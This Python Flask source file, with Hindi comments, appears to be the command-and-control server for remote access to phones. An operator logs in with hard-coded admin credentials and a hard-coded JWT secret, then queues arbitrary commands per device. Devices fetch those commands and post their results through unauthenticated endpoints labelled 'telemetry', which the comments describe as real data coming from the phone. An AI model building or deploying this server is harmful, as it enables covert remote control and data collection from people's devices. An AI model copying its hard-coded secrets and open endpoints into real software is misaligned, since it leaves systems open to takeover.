import jwt
import datetime
from functools import wraps
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

app.config['SECRET_KEY'] = 'SUPER_SECRET_STRONG_KEY_12345'
ADMIN_USERNAME = "admin"
ADMIN_PASSWORD = "password123"

# मेमोरी डिक्शनरी जो केवल असली डेटा ही रखेगी
pending_commands = {}
device_telemetry_results = {}
last_sent_commands = {}

def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get('Authorization')
        if not token:
            return jsonify({"status": "error", "message": "Token is missing!"}), 401
        try:
            if token.startswith("Bearer "):
                token = token.split(" ")[1]
            jwt.decode(token, app.config['SECRET_KEY'], algorithms=["HS256"])
        except Exception:
            return jsonify({"status": "error", "message": "Invalid or expired token!"}), 401
        return f(*args, **kwargs)
    return decorated

@app.route('/', methods=['GET'])
def home():
    return jsonify({"status": "running", "message": "API Hub Active"}), 200

@app.route('/api/login', methods=['POST'])
def login():
    data = request.get_json()
    if not data or data.get('username') != ADMIN_USERNAME or data.get('password') != ADMIN_PASSWORD:
        return jsonify({"status": "error", "message": "Invalid Credentials"}), 401
    
    token = jwt.encode({
        'user': ADMIN_USERNAME,
        'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    }, app.config['SECRET_KEY'], algorithm="HS256")
    
    return jsonify({"status": "success", "token": token}), 200

@app.route('/api/execute', methods=['POST'])
@token_required
def execute_command():
    data = request.get_json()
    command = data.get('command')
    device_id = data.get('device_id', 'DEFAULT_DEVICE')
    
    if not command:
        return jsonify({"status": "error", "message": "Command required"}), 400
    
    # नई कमांड सेट करते ही पुराना रिजल्ट हटा दें ताकि पता चले नया डेटा आया है या नहीं
    pending_commands[device_id] = command
    last_sent_commands[device_id] = command
    if device_id in device_telemetry_results:
        del device_telemetry_results[device_id]  # पुराना डेटा क्लियर ताकि फेक न दिखे

    return jsonify({"status": "success", "message": "Command queued"}), 200

@app.route('/api/v1/command/fetch', methods=['GET'])
def fetch_command():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    cmd = pending_commands.get(device_id, "none")
    
    # कमांड फेच होने के बाद पेंडिंग से हटा दें ताकि बार-बार रिपीट न हो
    if cmd != "none":
        pending_commands[device_id] = "none"

    return jsonify({"cmd": cmd, "status": "success"}), 200

@app.route('/api/v1/telemetry', methods=['POST'])
def post_telemetry():
    data = request.get_json()
    if not data:
        return jsonify({"status": "error", "message": "No data"}), 400
        
    device_id = data.get('device_id', 'DEFAULT_DEVICE')
    
    # ऐप 'cmd' भेजना भूल गया है, तो सर्वर अपनी मेमोरी से आखिरी भेजी गई कमांड उठा लेगा
    cmd = data.get('cmd') or last_sent_commands.get(device_id, 'Unknown')
    result_data = data.get('result', data)
    
    # यहाँ फोन से आया हुआ असली डेटा सेव हो रहा है
    device_telemetry_results[device_id] = {
        "command": cmd,
        "result": result_data,
        "timestamp": str(datetime.datetime.now())
    }

    return jsonify({"status": "success", "message": "Telemetry saved"}), 200

@app.route('/api/get-latest-result', methods=['GET'])
@token_required
def get_latest_result():
    device_id = request.args.get('device_id', 'DEFAULT_DEVICE')
    
    # अगर फोन ने अभी तक डेटा नहीं भेजा है, तो साफ बताएँ कि डेटा नहीं आया है
    if device_id not in device_telemetry_results:
        return jsonify({
            "status": "waiting",
            "message": "App has not posted telemetry yet for this command."
        }), 200

    return jsonify({
        "status": "success",
        "data": device_telemetry_results[device_id]
    }), 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
